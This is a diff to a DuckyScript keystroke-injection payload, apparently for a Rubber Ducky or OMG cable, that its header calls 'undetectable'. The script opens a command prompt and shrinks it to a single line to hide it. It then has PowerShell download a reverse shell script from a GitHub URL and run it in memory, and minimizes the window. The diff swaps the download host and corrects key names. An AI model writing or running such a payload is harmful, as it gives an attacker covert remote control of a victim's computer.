@@ -8,19 +8,18 @@ REM # undetectable.                                                             
 REM # Author: Hug1n                                                                                             #
 REM ############################################################################################################# 
 
-REM @@ Opening the CMD
 GUI r 
 DELAY 500
 STRING cmd.exe
 ENTER 
 DELAY 200
 REM @@ Changing the color, risizing the CMD and executing the reverse shell in memory
-STRING cmd /C color FE&mode con:cols=18 lines=1&powershell "iex(iwr raw.githubusercontent.com/Hug1n/reverse_shells/main/minrev.ps1)"
+STRING cmd /C color FE&mode con:cols=18 lines=1&powershell "IEX(NEW-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ferbie10/omg-payloads/master/minrev.ps1')"
 DELAY 200
 ENTER
 REM @@ Minimizing the CMD
 ALT SPACE
-DOWN
-DOWN
-DOWN
+DOWNARROW
+DOWNARROW
+DOWNARROW
 ENTER
